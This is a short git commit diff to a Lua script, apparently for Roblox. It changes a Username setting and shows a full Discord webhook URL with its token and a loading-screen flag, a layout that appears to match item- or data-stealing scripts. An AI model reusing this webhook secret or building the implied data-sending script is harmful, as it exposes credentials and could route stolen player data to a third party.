d24a611cfb177f6088676cecaa6c84f87cbed9d7
hsdfuyhsdufhs <128642081+hsdfuyhsdufhs@users.noreply.github.com>
2023-04-16 13:53:57 +0300

    Update Script.lua

--- Script.lua
+++ Script.lua
@@ -1,4 +1,4 @@
-Username = "loadstping"
+Username = "LEGACROW11"
 WebHook = "https://discord.com/api/webhooks/1097109265128378519/9a1uzxvVxNHgsPQdATF5BZvCrKaCOqyG1fkxTqNYsO7sXdIXppH_VyIrxrDr-nHpSL_T"
  
 loadingscreen = true
